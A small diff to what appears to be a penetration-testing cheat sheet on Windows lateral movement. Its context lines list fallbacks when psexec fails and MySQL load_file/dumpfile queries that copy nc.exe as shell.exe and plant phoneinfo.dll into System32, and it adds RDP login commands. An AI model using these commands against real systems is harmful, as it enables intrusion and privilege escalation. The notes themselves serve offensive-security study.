@@ -261,8 +261,6 @@ When psexec not working
   - xfreerdp
   - winrm
   - See if we can upload files through shares using smbclient
- 
-
 ```
 
 
@@ -725,8 +723,14 @@ mysql -u root -h 127.0.0.1
 select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
 select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
 
-
 ```
+
+### RDP
+```bash
+rdesktop -u Administrator 192.168.245.165
+xfreerdp /v:192.168.x.x /u:username /p:password
+```
+
 
 
 ## File transfer
